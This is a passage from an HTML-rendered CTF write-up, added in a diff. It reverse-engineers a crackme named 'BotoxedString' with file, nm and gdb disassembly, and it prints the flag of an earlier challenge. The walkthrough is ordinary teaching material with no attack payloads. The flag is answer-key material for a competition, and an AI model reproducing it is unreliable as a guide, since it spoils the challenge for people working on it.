+Well &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; Validate the chall with : flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;S0_U_R_A_2000_k1dd1E?&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Inferior 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;process 30296&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; exited normally]
+Warning: not running or target is remote
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Done.&lt;/p&gt;
+&lt;h1 id=&quot;4-botoxedstring&quot;&gt;4. BotoxedString&lt;/h1&gt;
+&lt;p&gt;This one was a reverse engineering challenge. It is a basic crackme. Let’s begin by checking the binary:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file crackme 
+crackme: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;f77ab6f416fda31fd9e9496b3712353d3fc1ec0d, not stripped
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lh&lt;/span&gt; crackme 
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 meffre_q meffre_q 9.5K Sep 21 21:44 crackme
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nm crackme 
+00000000004007c6 T areYouLegit
+0000000000601278 B __bss_start
+0000000000601280 b completed.6661
+0000000000601268 D __data_start
+0000000000601268 W data_start
+0000000000400700 t deregister_tm_clones
+0000000000400780 t __do_global_dtors_aux
+0000000000601008 t __do_global_dtors_aux_fini_array_entry
+0000000000601270 D __dso_handle
+0000000000601018 d _DYNAMIC
+0000000000601278 D _edata
+0000000000601288 B _end
+                 U &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;@@GLIBC_2.2.5
+0000000000400b44 T _fini
+                 U fprintf@@GLIBC_2.2.5
+00000000004007a0 t frame_dummy
+0000000000601000 t __frame_dummy_init_array_entry
+0000000000400d98 r __FRAME_END__
+                 U free@@GLIBC_2.2.5
+                 U fwrite@@GLIBC_2.2.5
+00000000006011f0 d _GLOBAL_OFFSET_TABLE_
+                 w __gmon_start__
+00000000004005e0 T _init
+0000000000601008 t __init_array_end
+0000000000601000 t __init_array_start
+0000000000400b50 R _IO_stdin_used
+                 w _ITM_deregisterTMCloneTable
+                 w _ITM_registerTMCloneTable
+0000000000601010 d __JCR_END__
+0000000000601010 d __JCR_LIST__
+                 w _Jv_RegisterClasses
+0000000000400957 T letsCheckThisPass
+0000000000400b40 T __libc_csu_fini
+0000000000400ad0 T __libc_csu_init
+                 U __libc_start_main@@GLIBC_2.2.5
+00000000004009b3 T main
+                 U malloc@@GLIBC_2.2.5
+                 U open@@GLIBC_2.2.5
+000000000040087f T passwordBeautifyier
+                 U &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@@GLIBC_2.2.5
+                 U &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;@@GLIBC_2.2.5
+0000000000400740 t register_tm_clones
+00000000004006d0 T _start
+0000000000601278 B stderr@@GLIBC_2.2.5
+                 U strlen@@GLIBC_2.2.5
+                 U strncmp@@GLIBC_2.2.5
+0000000000601278 D __TMC_END__
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./crackme 
+Usage: ./crackme Password
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./crackme toto
+Someone told me u were not allowed to &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;that
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We faced a basic crackme, without stripped, dynamically linked and we can see different function name thanks to “nm”.&lt;/p&gt;
+
+&lt;p&gt;So let’s begin the reversing part!&lt;/p&gt;
+
+&lt;p&gt;The first interesting part is the call to the “areYouLegit” function with the first program argument, in the “main” function:&lt;/p&gt;
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crackme&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Reading&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crackme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;debugging&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)...&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;peda&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disas&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;Dump&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004009f2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004009f6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;67&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004009fa&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;71&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rax]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004009fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400a00&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x4007c6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;areYouLegit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The function will do 4 test on the program argument:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Check if the string size is greater than 7.&lt;/li&gt;
+  &lt;li&gt;Check if the string contain at least one ‘-‘ character.&lt;/li&gt;
+  &lt;li&gt;Check if the string contain at least one ‘+’ character.&lt;/li&gt;
+  &lt;li&gt;Check if the string contain at least one ‘@’ character.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;If one of this tests failed, the function exit with an error code and the program stop their.&lt;/p&gt;
+
+&lt;p&gt;After, the main function will call the function “letsCheckThisPass”, let’s disassemble it:&lt;/p&gt;
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;peda&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disas&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;letsCheckThisPass&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Dump&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;letsCheckThisPass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400957&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400958&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040095b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040095f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400963&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400967&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040096a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x40087f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwordBeautifyier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040096f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400973&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400977&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040097c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400b58&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400981&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400984&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x400620&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400989&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;test&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040098b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x4009a0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;letsCheckThisPass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040098d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400991&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400994&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x400610&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400999&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040099e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;71&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jmp&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x4009b1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;letsCheckThisPass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x00000000004009a0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x00000000004009a4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x00000000004009a7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x400610&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x00000000004009ac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x00000000004009b1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;leave&lt;/span&gt;  
